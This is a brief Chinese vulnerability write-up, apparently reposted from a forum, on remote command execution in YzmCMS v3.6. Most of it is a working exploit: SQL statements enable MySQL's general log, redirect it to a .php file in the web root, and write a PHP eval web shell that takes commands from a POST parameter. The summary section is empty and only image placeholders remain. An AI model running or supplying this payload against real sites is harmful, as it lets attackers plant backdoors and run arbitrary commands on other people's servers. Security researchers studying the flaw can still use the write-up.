# YzmCMS v3.6 远程命令执行

> 原文：[https://www.zhihuifly.com/t/topic/3303](https://www.zhihuifly.com/t/topic/3303)

# YzmCMS v3.6 远程命令执行

## 一、漏洞简介

## 二、漏洞影响

YzmCMS v3.6

## 三、复现过程

Payload：

```
show variables like '%general%';   #查看配置
set global general_log = on;        #开启general log模式
set global general_log_file =CONCAT("E:\\study\\WWW\\YzmCMS\\test.","php"); 
select '<?php eval($_POST[cmd]);?>';   #写入shell 
```

##### 1、执行sql语句，查看mysql日志配置情况

![image](img/973de0308b0b5b1933c9c56b257e1b8e.png)

#### 2、根据日志文件位置或者默认站点路径来推测站点目录，可用load_file()函数来测试，确认站点目录位置。或者通过phpinfo()等信息收集获取站点目录。

![image](img/023e936ec7fcb260e5e66ab100228688.png)

#### 3、分别执行下列sql语句，将脚本代码写入文件：

```
set global general_log = on; `set global general_log_file =CONCAT(“E:\study\WWW\YzmCMS\test.”,“php”); select ‘<?php eval($_POST[cmd]);?>’;` 
```

![image](img/2f2b3388652c844952886f2df0041a81.png)

#### 4、提交参数，执行脚本代码：

![image](img/d538301de6795547d78c5b6b1aad0f11.png)